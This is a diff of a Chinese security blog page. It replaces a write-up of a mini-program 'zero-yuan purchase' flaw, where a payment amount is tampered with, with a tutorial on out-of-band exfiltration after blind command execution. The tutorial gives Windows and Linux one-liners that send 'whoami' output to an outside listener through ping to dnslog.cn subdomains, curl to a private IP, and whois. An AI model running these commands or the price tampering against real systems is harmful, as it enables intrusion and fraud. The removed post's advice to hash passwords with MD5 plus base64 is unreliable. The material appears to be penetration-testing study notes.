@@ -16,31 +16,32 @@
   <meta name="author" content="liuty">
   <meta name="keywords" content="">
   
-    <meta name="description" content="概述一次简单的微信小程序漏洞挖掘。在选中商品进行支付的时候，会get一个请求，这个请求主题部分进行了url编码，当我们解码之后就可以看到商品的id号，支付金额等信息，并且没有做安全校验，只需要修改成我们想要修改的金额，直接发送数据包，就可以支付，从而达到“零元购”的危害，考虑到漏洞还没修复，所以做了厚码保护处理 声明：本文所涉及到的漏洞均已提交CNVD，切勿做违法测试! 演示首先进行环境准备，考虑">
+    <meta name="description" content="利用场景在注入时, 存在盲注或者延时, 我们获得需要数据就会频繁请求, 最后导致IP 被Ban,还有就是当我们进行命令执行的时候，目标站点什么也不显示,无法确定,所以用DNSlog外带可以减少请求并且直接回显数据dnslog 数据外带通常用在以下情景： 1.SQL盲注2.无回显的XSS3.无回显的命令执行5.无回显的SSRF5.Blind XXE 原理将需要查询的值和域名拼接起来，向域名发送请求，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次小程序“零元购”漏洞挖掘">
-<meta property="og:url" content="http://example.com/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.html">
+<meta property="og:title" content="命令执行无回显下的数据外带">
+<meta property="og:url" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/index.html">
 <meta property="og:site_name" content="liuty&#39;s blog">
-<meta property="og:description" content="概述一次简单的微信小程序漏洞挖掘。在选中商品进行支付的时候，会get一个请求，这个请求主题部分进行了url编码，当我们解码之后就可以看到商品的id号，支付金额等信息，并且没有做安全校验，只需要修改成我们想要修改的金额，直接发送数据包，就可以支付，从而达到“零元购”的危害，考虑到漏洞还没修复，所以做了厚码保护处理 声明：本文所涉及到的漏洞均已提交CNVD，切勿做违法测试! 演示首先进行环境准备，考虑">
+<meta property="og:description" content="利用场景在注入时, 存在盲注或者延时, 我们获得需要数据就会频繁请求, 最后导致IP 被Ban,还有就是当我们进行命令执行的时候，目标站点什么也不显示,无法确定,所以用DNSlog外带可以减少请求并且直接回显数据dnslog 数据外带通常用在以下情景： 1.SQL盲注2.无回显的XSS3.无回显的命令执行5.无回显的SSRF5.Blind XXE 原理将需要查询的值和域名拼接起来，向域名发送请求，">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/3f49779d8e794ca3bbaae4f98242580.jpg">
-<meta property="og:image" content="http://example.com/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/90bbb441dffa24cdc3fdd8981288bb0.jpg">
-<meta property="og:image" content="http://example.com/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/46a15724cb0af21361d0a008431e310.jpg">
-<meta property="og:image" content="http://example.com/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/4edbac588f3d7c06e65bc87fe186be3.jpg">
-<meta property="og:image" content="http://example.com/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/4af9118c44e585f7e6a01f785c78895.jpg">
-<meta property="og:image" content="http://example.com/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/6de7f1a907df9acaddc4ab2c5cc21a5.jpg">
-<meta property="og:image" content="http://example.com/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/b5330591e5a598557846d46a138f870.jpg">
-<meta property="og:image" content="http://example.com/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/1913f76c114876f130db9cbd2cda8c0.jpg">
-<meta property="article:published_time" content="2024-02-02T08:27:35.000Z">
-<meta property="article:modified_time" content="2024-02-02T09:08:27.520Z">
+<meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_10-36.png">
+<meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-40.png">
+<meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-42.png">
+<meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-56.png">
+<meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-51.png">
+<meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-20.png">
+<meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-23.png">
+<meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-31.png">
+<meta property="og:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-29.png">
+<meta property="article:published_time" content="2024-02-03T02:08:26.000Z">
+<meta property="article:modified_time" content="2024-02-03T03:07:26.997Z">
 <meta property="article:author" content="liuty">
-<meta property="article:tag" content="挖洞">
+<meta property="article:tag" content="技巧总结">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/3f49779d8e794ca3bbaae4f98242580.jpg">
+<meta name="twitter:image" content="http://example.com/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_10-36.png">
   
   
   
-  <title>记一次小程序“零元购”漏洞挖掘 - liuty&#39;s blog</title>
+  <title>命令执行无回显下的数据外带 - liuty&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -235,7 +236,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="记一次小程序“零元购”漏洞挖掘"></span>
+            <span id="subtitle" data-typed-text="命令执行无回显下的数据外带"></span>
           
         </div>
 
@@ -246,8 +247,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-02-02 16:27" pubdate>
-          2024年2月2日 下午
+        <time datetime="2024-02-03 10:08" pubdate>
+          2024年2月3日 上午
         </time>
       </span>
     
@@ -258,7 +259,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          465 字
+          312 字
         
       </span>
     
@@ -269,7 +270,7 @@
         
         
         
-          4 分钟
+          3 分钟
         
       </span>
     
@@ -314,35 +315,45 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">记一次小程序“零元购”漏洞挖掘</h1>
+            <h1 id="seo-header">命令执行无回显下的数据外带</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>一次简单的微信小程序漏洞挖掘。在选中商品进行支付的时候，会get一个请求，这个请求主题部分进行了url编码，当我们解码之后就可以看到商品的id号，支付金额等信息，并且没有做安全校验，只需要修改成我们想要修改的金额，直接发送数据包，就可以支付，从而达到“零元购”的危害，考虑到漏洞还没修复，所以做了厚码保护处理</p>
-<p>声明：本文所涉及到的漏洞均已提交CNVD，切勿做违法测试!</p>
-<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>首先进行环境准备，考虑到微信不能直接走系统代理，为了方便抓数据包，做了三层代理：proxypin + burpsuite + 手机网络设置<br>打开小程序抓包，选中一个商品</p>
-<img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/3f49779d8e794ca3bbaae4f98242580.jpg" srcset="/img/loading.gif" lazyload class="" title="3f49779d8e794ca3bbaae4f98242580.jpg">
+                <h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>在注入时, 存在盲注或者延时, 我们获得需要数据就会频繁请求, 最后导致IP 被Ban,还有就是当我们进行命令执行的时候，目标站点什么也不显示,无法确定,所以用DNSlog外带可以减少请求并且直接回显数据<br>dnslog 数据外带通常用在以下情景：</p>
+<p>1.SQL盲注<br>2.无回显的XSS<br>3.无回显的命令执行<br>5.无回显的SSRF<br>5.Blind XXE</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>将需要查询的值和域名拼接起来，向域名发送请求，便会传递到自己这里，然后通过读日志获取信息。为了方便理解，我自己模糊的做了一个原理图</p>
+<img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_10-36.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_10-36.png">
 
 
-<p>当我们支付的时候，会GET一个&#x2F;<em><strong>&#x2F;</strong></em>&#x2F;pay.php一个请求，里面是url编码，当我们解码就可以看到我们的支付金额的位置，只需要修改成我们想要的金额，接着发包就会弹出一个二维码，支付就好了</p>
-<img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/90bbb441dffa24cdc3fdd8981288bb0.jpg" srcset="/img/loading.gif" lazyload class="" title="90bbb441dffa24cdc3fdd8981288bb0.jpg">
-
-<img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/46a15724cb0af21361d0a008431e310.jpg" srcset="/img/loading.gif" lazyload class="" title="46a15724cb0af21361d0a008431e310.jpg">
-
-<img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/4edbac588f3d7c06e65bc87fe186be3.jpg" srcset="/img/loading.gif" lazyload class="" title="4edbac588f3d7c06e65bc87fe186be3.jpg">
-
-<img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/4af9118c44e585f7e6a01f785c78895.jpg" srcset="/img/loading.gif" lazyload class="" title="4af9118c44e585f7e6a01f785c78895.jpg">
-
-<img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/6de7f1a907df9acaddc4ab2c5cc21a5.jpg" srcset="/img/loading.gif" lazyload class="" title="6de7f1a907df9acaddc4ab2c5cc21a5.jpg">
+<h2 id="Windows中的利用方式"><a href="#Windows中的利用方式" class="headerlink" title="Windows中的利用方式"></a>Windows中的利用方式</h2><h1 id="for-ping"><a href="#for-ping" class="headerlink" title="for + ping"></a>for + ping</h1><p>命令示例：for &#x2F;F “delims&#x3D;&quot; %i in (‘whoami’) do ping %i.xxx.dnslog.cn</p>
+<img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-40.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-40.png">
 
 
-<p>仅作为漏洞挖掘测试，漏洞验证后第一时间选择了退款，遵守网络安全法律</p>
-<img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/b5330591e5a598557846d46a138f870.jpg" srcset="/img/loading.gif" lazyload class="" title="b5330591e5a598557846d46a138f870.jpg">
+<h2 id="for-curl"><a href="#for-curl" class="headerlink" title="for + curl"></a>for + curl</h2><p>命令示例：for &#x2F;F “delims&#x3D;&quot; %i in (‘whoami’) do curl <a target="_blank" rel="noopener" href="http://192.168.43.190:8000/%i">http://192.168.43.190:8000/%i</a></p>
+<img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-42.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-42.png">
 
-<img src="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/1913f76c114876f130db9cbd2cda8c0.jpg" srcset="/img/loading.gif" lazyload class="" title="1913f76c114876f130db9cbd2cda8c0.jpg">
 
-<h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>从代码层面进行安全检测，存储用户密码的地方进行严格的过滤，再一个就是敏感的信息在传输过程，以及显示到网站里的时候都要进行加密，MD5加密，数据SSL加密传输，重要的数据尽可能的使用POST的提交方式进行，用户密码要使用加强的加密方式MD5+base64特殊编码的方式进行加密，对于网站的一些报错页面也要禁止掉回显</p>
+<h1 id="用户名变量"><a href="#用户名变量" class="headerlink" title="%用户名变量%"></a>%用户名变量%</h1><p>直接通过%用户变量%来获取信息</p>
+<img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-56.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-56.png">
+
+<img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-51.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-51.png">
+
+
+<h2 id="Linux中的利用方式"><a href="#Linux中的利用方式" class="headerlink" title="Linux中的利用方式"></a>Linux中的利用方式</h2><h1 id="反引号-ping"><a href="#反引号-ping" class="headerlink" title="反引号 + ping"></a>反引号 + ping</h1><p>命令示例：ping <code>whoami</code>.foxd5a.dnslog.cn</p>
+<img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-20.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-20.png">
+
+
+<h1 id="ping"><a href="#ping" class="headerlink" title="$() + ping"></a>$() + ping</h1><p>命令示例：ping $(whoami).dyy8n3.dnslog.cn</p>
+<img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-23.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-23.png">
+
+
+<h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><p>命令示例：curl <a target="_blank" rel="noopener" href="http://192.168.43.190:8000/%60whoami%60">http://192.168.43.190:8000/`whoami`</a></p>
+<img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-31.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-31.png">
+
+
+<h1 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h1><p>命令示例：whois -h 192.168.233.128 -p 8888 <code>whoami</code><br>vps上nc开启监听，获取到命令执行结果</p>
+<img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-29.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-03_09-29.png">
 
                 
               </div>
@@ -376,7 +387,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%8C%96%E6%B4%9E/" class="print-no-link">#挖洞</a>
+        <a href="/tags/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/" class="print-no-link">#技巧总结</a>
       
     </div>
   
@@ -388,8 +399,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>记一次小程序“零元购”漏洞挖掘</div>
-      <div>http://example.com/2024/02/02/记一次小程序“零元购”漏洞挖掘/</div>
+      <div>命令执行无回显下的数据外带</div>
+      <div>http://example.com/2024/02/03/命令执行无回显下的数据外带/</div>
     </div>
     <div class="license-meta">
       
@@ -401,7 +412,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年2月2日</div>
+          <div>2024年2月3日</div>
         </div>
       
       
@@ -433,18 +444,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/" title="命令执行无回显下的数据外带">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">命令执行无回显下的数据外带</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/" title="ldap配合基于资源的约束委派">
-                        <span class="hidden-mobile">ldap配合基于资源的约束委派</span>
+                      <a href="/2024/02/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E2%80%9C%E9%9B%B6%E5%85%83%E8%B4%AD%E2%80%9D%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" title="记一次小程序“零元购”漏洞挖掘">
+                        <span class="hidden-mobile">记一次小程序“零元购”漏洞挖掘</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
